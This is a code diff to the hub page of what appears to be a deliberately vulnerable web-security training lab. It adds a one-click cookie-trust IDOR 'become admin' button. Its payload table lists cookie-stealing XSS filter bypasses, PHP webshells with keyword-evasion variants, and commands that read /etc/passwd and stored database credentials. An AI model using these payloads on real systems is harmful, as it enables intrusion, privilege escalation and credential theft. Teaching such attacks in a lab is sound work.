@@ -88,6 +88,11 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
   <form method="get" action="profile.php" target="r_id" onsubmit="show('r_id')">
     <input type="hidden" name="level" id="lvl_id" value="easy"><input type="hidden" name="embed" value="1">
     <input type="text" id="in_id" name="id" placeholder="id (or encoded id)…" style="min-width:170px"><button>Run ▶</button></form>
+  <div class="muted" style="margin-top:4px">expert (cookie-trust, no DevTools needed):
+    <button type="button" class="ghost" onclick="setUid(1)">become uid=1 (admin) ▶</button>
+    <button type="button" class="ghost" onclick="clearUid()">clear uid</button>
+    <span style="font-size:.82em">— sets a <code>uid</code> cookie <b>scoped to <code>/profile.php</code></b> (only this exercise, not the whole site), then reloads your "profile"</span>
+  </div>
   <iframe name="r_id" id="r_id" class="res"></iframe></div>
 
 <!-- Net Tools: command injection (leveled) -->
@@ -163,6 +168,10 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 <script>
 function fill(inputId, plId){ var i=document.getElementById(inputId); i.value=document.getElementById(plId).textContent; i.dispatchEvent(new Event('input')); }
 function show(frameId){ document.getElementById(frameId).style.display='block'; }
+// Expert IDOR: the server trusts a 'uid' cookie. Set it from the Hub, scoped to /profile.php so it is
+// sent ONLY to the IDOR endpoint (not the Hub or any other exercise), then reload just this card's frame.
+function setUid(v){ document.cookie='uid='+v+'; path=/profile.php'; setLvl('id','expert'); show('r_id'); document.getElementById('r_id').src='profile.php?level=expert&embed=1'; }
+function clearUid(){ document.cookie='uid=; path=/profile.php; max-age=0'; show('r_id'); document.getElementById('r_id').src='profile.php?level=expert&embed=1'; }
 function setCmd(c){ var i=document.getElementById('in_up'); i.value=c; i.dispatchEvent(new Event('input')); }
 const PAYLOADS = {
  q:{
@@ -189,7 +198,7 @@ PAYLOADS.q.medium.x='"><img src=x onerror=alert(1)>';
 PAYLOADS.q.hard.x='"><svg onload=alert(1)>';
 PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
 PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
-PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — set cookie uid=1)",n:"Expert — the ?id is ignored; the app trusts a uid cookie. DevTools → Application → Cookies → add uid=1, then Run."}};
+PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — the app trusts a uid cookie)",n:"Expert — the ?id is ignored; the app trusts a 'uid' cookie. Easiest: click 'become uid=1 (admin) ▶' below (sets a uid cookie scoped to /profile.php, so only this exercise is touched). Manual/classic way: DevTools → Application → Cookies → add uid=1, then Run. Both work."}};
 PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no content checks."},medium:{p:"<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Medium — 'system' blocked in content -> passthru()."},hard:{p:"<\x3Fphp echo `$_GET[cmd]`; ?\x3E",n:"Hard — exec-family blocked -> backticks."},expert:{p:"<\x3Fphp $f='sy'.'stem'; $f($_GET['cmd']); ?\x3E",n:"Expert — backticks blocked -> split the name (sy.stem -> system)."}};
 // Per-level webshell objective: a DIFFERENT real post-exploitation use case at each level.
 PAYLOADS.upcmd={easy:{cmd:"id",why:"confirm which OS user the web server runs as"},medium:{cmd:"cat /etc/passwd",why:"enumerate the local user accounts"},hard:{cmd:"cat ../private/db_credentials.txt",why:"loot stored credentials (the DB password)"},expert:{cmd:"cat ../private/upload_flag.txt",why:"exfiltrate the target secret (the flag)"}};
